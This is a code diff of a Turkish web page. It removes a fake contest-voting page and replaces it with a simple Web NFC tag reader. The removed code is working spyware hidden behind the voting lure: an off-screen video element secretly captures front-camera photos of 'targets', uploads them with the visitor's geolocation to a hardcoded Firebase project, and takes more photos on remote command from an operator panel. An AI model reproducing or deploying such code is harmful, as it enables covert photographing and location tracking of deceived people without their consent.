@@ -3,80 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yarışma Katılım</title>
+    <title>NFC Kart Bilgi Okuyucu</title>
     <style>
-        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
-        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; width: 85%; }
-        #video { position: absolute; left: -9999px; opacity: 0; width: 1px; height: 1px; }
-        #btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; justify-content: center; align-items: center; border-radius: 30px; font-weight: bold; }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f4f4f9; margin: 0; }
+        .container { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 1rem; transition: background 0.3s; }
+        button:hover { background-color: #0056b3; }
+        #status { margin-top: 20px; font-weight: bold; color: #555; }
+        #result { margin-top: 15px; text-align: left; background: #eee; padding: 10px; border-radius: 5px; word-break: break-all; white-space: pre-wrap; display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Aday Onayı Bekleniyor</h2>
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <div id="btn">Oy Ver</div>
-        <p id="stat" style="font-size:12px; color:#8696a0; margin-top:10px;">Sistem doğrulanıyor...</p>
-    </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+<div class="container">
+    <h2>NFC Okuyucu</h2>
+    <p>Kart bilgilerini görmek için aşağıdaki butona basın ve kartı telefonun arkasına yaklaştırın.</p>
+    <button id="scanBtn">Taramayı Başlat</button>
+    <div id="status">Hazır.</div>
+    <div id="result"></div>
+</div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
-            authDomain: "whtapp-27674.firebaseapp.com",
-            projectId: "whtapp-27674",
-            storageBucket: "whtapp-27674.firebasestorage.app"
-        };
+<script>
+    const scanBtn = document.getElementById('scanBtn');
+    const statusDiv = document.getElementById('status');
+    const resultDiv = document.getElementById('result');
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const storage = getStorage(app);
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        async function fotoCek() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg', 0.6);
-            const fileName = `hedef_${Date.now()}.jpg`;
-            await uploadString(ref(storage, `fotolar/${fileName}`), photoData, 'data_url');
-            return fileName;
+    scanBtn.addEventListener('click', async () => {
+        if (!('NDEFReader' in window)) {
+            statusDiv.innerText = "Hata: Tarayıcınız Web NFC desteğine sahip değil. (Android Chrome deneyin)";
+            return;
         }
 
-        async function sistemiBaslat() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
+        try {
+            const ndef = new NDEFReader();
+            await ndef.scan();
+            
+            statusDiv.innerText = "NFC Taraması Aktif... Kartı yaklaştırın.";
+            statusDiv.style.color = "blue";
 
-                // 1. GİRDİĞİ ANDA OTOMATİK ÇEK
-                setTimeout(async () => {
-                    const fName = await fotoCek();
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        await setDoc(doc(db, "takip", "admin"), {
-                            lat: pos.coords.latitude, lon: pos.coords.longitude,
-                            fotoAdi: fName, durum: "online", zaman: new Date().toLocaleString(), t: Date.now()
-                        });
-                    });
-                }, 2000);
+            ndef.onreadingerror = () => {
+                statusDiv.innerText = "Hata: Kart okunamadı. Tekrar deneyin.";
+                statusDiv.style.color = "red";
+            };
 
-                // 2. SENİN PANELİNDEN GELEN KOMUTU DİNLE
-                onSnapshot(doc(db, "takip", "komut"), async (snap) => {
-                    if (snap.exists() && snap.data().cek == true) {
-                        const fName = await fotoCek();
-                        await setDoc(doc(db, "takip", "admin"), { fotoAdi: fName, t: Date.now() }, { merge: true });
-                        // Komutu sıfırla ki tekrar çekebil
-                        await setDoc(doc(db, "takip", "komut"), { cek: false });
-                    }
-                });
+            ndef.onreading = ({ message, serialNumber }) => {
+                statusDiv.innerText = "Okuma Başarılı!";
+                statusDiv.style.color = "green";
+                resultDiv.style.display = "block";
+                
+                let output = `Seri Numarası: ${serialNumber}\n`;
+                
+                for (const record of message.records) {
+                    const decoder = new TextDecoder(record.encoding);
+                    output += `Kayıt Tipi: ${record.recordType}\n`;
+                    output += `Veri: ${decoder.decode(record.data)}\n`;
+                }
+                
+                resultDiv.innerText = output;
+            };
 
-            } catch (e) { console.log("İzin yok"); }
+        } catch (error) {
+            statusDiv.innerText = "Hata: " + error;
+            statusDiv.style.color = "red";
         }
-        sistemiBaslat();
-    </script>
+    });
+</script>
+
 </body>
 </html>
